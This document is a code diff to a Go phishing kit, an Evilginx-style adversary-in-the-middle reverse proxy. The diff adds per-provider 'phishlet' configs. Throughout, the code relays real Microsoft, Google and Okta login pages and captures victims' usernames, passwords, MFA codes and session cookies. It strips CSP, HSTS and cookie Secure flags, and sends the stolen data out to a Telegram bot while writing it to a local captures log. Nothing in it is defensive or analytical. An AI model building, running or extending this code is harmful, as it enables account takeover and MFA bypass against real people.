@@ -1,6 +1,6 @@
 // proxy-server — Evilginx-style AiTM reverse proxy with Telegram capture.
-// Victim sees the REAL login page (Microsoft/Google/Okta) proxied through us.
-// Credentials and session cookies captured and sent to Telegram.
+// Phishlet configs define per-provider login flows, credential fields, and session cookies.
+// Victim sees the REAL login page proxied through us.
 
 package main
 
@@ -28,6 +28,7 @@ var (
 	telegramToken  string
 	telegramChatID string
 	phishingHost   string
+	phishlets      []Phishlet
 )
 
 func main() {
@@ -35,12 +36,22 @@ func main() {
 	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
 	phishingHost = os.Getenv("PHISHING_HOST")
 	if phishingHost == "" {
-		phishingHost = "localhost:9090"
+		phishingHost = "localhost:9091"
 	}
 
 	port := os.Getenv("PORT")
 	if port == "" {
 		port = "9091"
+	}
+
+	// Load phishlet configs
+	var err error
+	phishlets, err = loadPhishlets()
+	if err != nil {
+		log.Fatalf("FATAL: cannot load phishlets: %v", err)
+	}
+	if len(phishlets) == 0 {
+		log.Fatal("FATAL: no phishlets loaded")
 	}
 
 	bootloaderHTML, err := bootloaderFS.ReadFile("bootloader.html")
@@ -60,23 +71,19 @@ func main() {
 		w.Write([]byte("ok"))
 	})
 
-	// Catch-all 404 — avoids Go's default "404 page not found" fingerprint
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusNotFound)
 		w.Write([]byte("<html><body></body></html>"))
 	})
 
-	log.Printf("Proxy server listening on :%s", port)
+	log.Printf("Proxy server listening on :%s (%d phishlets)", port, len(phishlets))
 	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
 	log.Fatal(http.ListenAndServe(":"+port, handler))
 }
 
-// handleRequest is the main dispatcher: bootloader or proxy.
 func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte) {
-	// If victim has _s cookie set, they're in the proxy flow
 	upstreamCookie, err := r.Cookie("_s")
 	if err != nil || upstreamCookie.Value == "" {
-		// No cookie — serve bootloader
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
 		w.Write(bootloaderHTML)
 		return
@@ -88,26 +95,30 @@ func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte
 		return
 	}
 
-	// Proxy the request to the real target
-	serveProxy(w, r, upstreamURL)
+	// Match phishlet from upstream host
+	pl := matchPhishlet(phishlets, upstreamURL)
+	if pl == nil {
+		log.Printf("[proxy] no phishlet matches upstream %s", upstreamURL)
+		w.Write(bootloaderHTML)
+		return
+	}
+
+	serveProxy(w, r, upstreamURL, pl)
 }
 
-// serveProxy reverse-proxies the request to the real login page.
-func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
+func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phishlet) {
 	target, err := url.Parse(upstream)
 	if err != nil {
 		http.Error(w, "bad request", http.StatusBadRequest)
 		return
 	}
 
-	// Capture POST body (credentials, MFA codes)
 	var reqBody []byte
 	if r.Body != nil && r.Method == "POST" {
 		reqBody, _ = io.ReadAll(r.Body)
 		r.Body = io.NopCloser(bytes.NewReader(reqBody))
 	}
 
-	// Capture incoming cookies from victim
 	victimCookies := r.Cookies()
 
 	proxy := &httputil.ReverseProxy{
@@ -116,30 +127,22 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
 			req.URL.Host = target.Host
 			req.Host = target.Host
 
-			// Rewrite Referer to hide our domain
 			if req.Header.Get("Referer") != "" {
 				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
 					phishingHost, target.Host, 1))
 			}
 
-			// Don't forward our tracking cookies to upstream
 			req.Header.Del("Cookie")
 			for _, c := range victimCookies {
-				if c.Name != "_s" {
+				if c.Name != "_s" && c.Name != "_c" {
 					req.AddCookie(c)
 				}
 			}
 		},
 		ModifyResponse: func(resp *http.Response) error {
-			// Capture Set-Cookie headers from upstream (session tokens!)
 			capturedCookies := resp.Header.Values("Set-Cookie")
-
-			// Rewrite response: change upstream domain → our domain in cookies and HTML
-			rewriteResponse(resp, target.Host, phishingHost)
-
-			// Fire capture notification
-			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream)
-
+			rewriteResponse(resp, target.Host, phishingHost, pl)
+			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
 			return nil
 		},
 		Transport: &http.Transport{
@@ -150,61 +153,61 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
 	proxy.ServeHTTP(w, r)
 }
 
-// rewriteResponse rewrites URLs, cookies, and CSP headers so the victim's browser
-// continues to route through our proxy.
-func rewriteResponse(resp *http.Response, upstreamHost, ourHost string) {
-	// Rewrite Set-Cookie domain
-	cookies := resp.Header.Values("Set-Cookie")
-	resp.Header.Del("Set-Cookie")
-	for _, c := range cookies {
-		// Strip domain= from cookies so they work on our domain
-		c = strings.ReplaceAll(c, "domain="+upstreamHost, "")
-		c = strings.ReplaceAll(c, "domain=."+upstreamHost, "")
-		c = strings.ReplaceAll(c, "Domain="+upstreamHost, "")
-		c = strings.ReplaceAll(c, "Domain=."+upstreamHost, "")
-		c = strings.ReplaceAll(c, "; Secure", "") // Allow over HTTP
-		resp.Header.Add("Set-Cookie", c)
+func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phishlet) {
+	if pl.Rewrite.StripCookieDomain || pl.Rewrite.StripCookieSecure {
+		cookies := resp.Header.Values("Set-Cookie")
+		resp.Header.Del("Set-Cookie")
+		for _, c := range cookies {
+			if pl.Rewrite.StripCookieDomain {
+				c = strings.ReplaceAll(c, "domain="+upstreamHost, "")
+				c = strings.ReplaceAll(c, "domain=."+upstreamHost, "")
+				c = strings.ReplaceAll(c, "Domain="+upstreamHost, "")
+				c = strings.ReplaceAll(c, "Domain=."+upstreamHost, "")
+			}
+			if pl.Rewrite.StripCookieSecure {
+				c = strings.ReplaceAll(c, "; Secure", "")
+				c = strings.ReplaceAll(c, "; secure", "")
+			}
+			resp.Header.Add("Set-Cookie", c)
+		}
 	}
 
-	// Strip CSP headers (they block our proxy modifications)
-	resp.Header.Del("Content-Security-Policy")
-	resp.Header.Del("Content-Security-Policy-Report-Only")
-
-	// Strip X-Frame-Options (some login pages block framing)
-	resp.Header.Del("X-Frame-Options")
+	if pl.Rewrite.StripCSP {
+		resp.Header.Del("Content-Security-Policy")
+		resp.Header.Del("Content-Security-Policy-Report-Only")
+	}
+	if pl.Rewrite.StripXFO {
+		resp.Header.Del("X-Frame-Options")
+	}
+	if pl.Rewrite.StripHSTS {
+		resp.Header.Del("Strict-Transport-Security")
+	}
+	if pl.Rewrite.RewriteLocation {
+		if loc := resp.Header.Get("Location"); loc != "" {
+			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
+			resp.Header.Set("Location", loc)
+		}
+	}
 }
 
-// notifyCapture sends captured credentials and session cookies to Telegram.
-func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string) {
+func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string, pl *Phishlet) {
 	telegramOk := telegramToken != "" && telegramChatID != ""
 	if !telegramOk {
 		log.Println("[telegram] bot not configured — skipping notification")
 	}
 
-	// Parse form data from POST body
+	// Extract credentials using phishlet's field definitions
 	var username, password string
 	if len(reqBody) > 0 {
 		bodyStr := string(reqBody)
-		// Quick parse of common form field names
-		for _, field := range []string{"login", "username", "email", "loginfmt"} {
-			if v := extractFormField(bodyStr, field); v != "" {
-				username = v
-				break
-			}
-		}
-		for _, field := range []string{"passwd", "password", "Password", "secret"} {
-			if v := extractFormField(bodyStr, field); v != "" {
-				password = v
-				break
-			}
-		}
-		// If still no username, try the first field
+		username = pl.extractUsername(bodyStr)
 		if username == "" {
 			username = extractFirstField(bodyStr)
 		}
+		password = pl.extractPassword(bodyStr)
 	}
 
-	// Write analytics event to shared JSONL
+	// Write analytics event
 	captureTime := time.Now().UTC().Format(time.RFC3339)
 	campaignCookie, _ := r.Cookie("_c")
 	campaignID := ""
@@ -214,7 +217,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	writeEvent(map[string]interface{}{
 		"timestamp":   captureTime,
 		"campaign_id": campaignID,
-		"brand":       getBrand(upstream),
+		"brand":       pl.Name,
 		"username":    username,
 		"ip":          r.RemoteAddr,
 		"user_agent":  r.UserAgent(),
@@ -226,7 +229,6 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		return
 	}
 
-	// Build Telegram message
 	captureTimeDisplay := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
 	ip := r.RemoteAddr
 	ua := r.UserAgent()
@@ -238,23 +240,43 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		"User-Agent: %s\n"+
 		"Time: %s\n"+
 		"Upstream: %s",
-		getBrand(upstream), username,
+		pl.Label, username,
 		username, password,
 		ip, ua,
 		captureTimeDisplay, upstream)
 
-	// Send message
 	sendTelegramMessage(msg)
 
-	// Build .txt attachment with session cookies
-	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
-		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
-			"Target: %s\nUsername: %s\nIP: %s\nTime: %s\n\n--- Session Cookies ---\n",
-			upstream, username, ip, captureTimeDisplay)
-
-		for _, c := range capturedCookies {
-			txtContent += c + "\n"
+	// Build .txt attachment with session cookies (filtered by phishlet)
+	var sessionLines []string
+	var otherLines []string
+	for _, c := range capturedCookies {
+		name := strings.SplitN(c, "=", 2)[0]
+		if pl.isSessionCookie(name) {
+			sessionLines = append(sessionLines, c)
+		} else {
+			otherLines = append(otherLines, c)
 		}
+	}
+
+	if len(sessionLines) > 0 || len(otherLines) > 0 {
+		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
+			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\n\n",
+			upstream, pl.Label, username, ip, captureTimeDisplay)
+
+		if len(sessionLines) > 0 {
+			txtContent += "--- Session Cookies (captured) ---\n"
+			for _, c := range sessionLines {
+				txtContent += c + "\n"
+			}
+		}
+		if len(otherLines) > 0 {
+			txtContent += "\n--- Other Cookies ---\n"
+			for _, c := range otherLines {
+				txtContent += c + "\n"
+			}
+		}
+		txtContent += fmt.Sprintf("\n--- Victim Cookies ---\n")
 		for _, c := range victimCookies {
 			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
 		}
@@ -265,7 +287,6 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 }
 
 func extractFormField(body, field string) string {
-	// Simple form field extraction (handles urlencoded and multipart)
 	for _, part := range strings.Split(body, "&") {
 		kv := strings.SplitN(part, "=", 2)
 		if len(kv) == 2 {
@@ -282,7 +303,7 @@ func extractFormField(body, field string) string {
 func extractFirstField(body string) string {
 	for _, part := range strings.Split(body, "&") {
 		kv := strings.SplitN(part, "=", 2)
-		if len(kv) == 2 && kv[1] != "" && !strings.Contains(kv[0], "uuid") && !strings.Contains(kv[0], "redirect") && !strings.Contains(kv[0], "csrf") {
+		if len(kv) == 2 && kv[1] != "" && !strings.Contains(kv[0], "uuid") && !strings.Contains(kv[0], "redirect") && !strings.Contains(kv[0], "csrf") && !strings.Contains(kv[0], "ctx") {
 			val, _ := url.QueryUnescape(kv[1])
 			return val
 		}
@@ -290,30 +311,17 @@ func extractFirstField(body string) string {
 	return ""
 }
 
-func getBrand(upstream string) string {
-	switch {
-	case strings.Contains(upstream, "microsoft") || strings.Contains(upstream, "office"):
-		return "Microsoft"
-	case strings.Contains(upstream, "google") || strings.Contains(upstream, "gmail"):
-		return "Google"
-	case strings.Contains(upstream, "okta"):
-		return "Okta"
-	default:
-		return "Unknown"
-	}
-}
-
 // ---- Telegram API ----
 
 func sendTelegramMessage(text string) {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
 	var buf bytes.Buffer
 	w := multipart.NewWriter(&buf)
 	w.WriteField("chat_id", telegramChatID)
 	w.WriteField("text", text)
 	w.Close()
 
-	req, _ := http.NewRequest("POST", url, &buf)
+	req, _ := http.NewRequest("POST", apiURL, &buf)
 	req.Header.Set("Content-Type", w.FormDataContentType())
 
 	client := &http.Client{Timeout: 10 * time.Second}
@@ -327,7 +335,7 @@ func sendTelegramMessage(text string) {
 }
 
 func sendTelegramDocument(caption, filename string, content []byte) {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramToken)
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramToken)
 	var buf bytes.Buffer
 	w := multipart.NewWriter(&buf)
 	w.WriteField("chat_id", telegramChatID)
@@ -336,7 +344,7 @@ func sendTelegramDocument(caption, filename string, content []byte) {
 	part.Write(content)
 	w.Close()
 
-	req, _ := http.NewRequest("POST", url, &buf)
+	req, _ := http.NewRequest("POST", apiURL, &buf)
 	req.Header.Set("Content-Type", w.FormDataContentType())
 
 	client := &http.Client{Timeout: 10 * time.Second}
@@ -355,7 +363,6 @@ func writeEvent(ev map[string]interface{}) {
 		log.Printf("[jsonl] marshal error: %v", err)
 		return
 	}
-	// Writes with 0600 permissions — analytics server must run as same user to decrypt/read
 	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	if err != nil {
 		log.Printf("[jsonl] open error: %v", err)
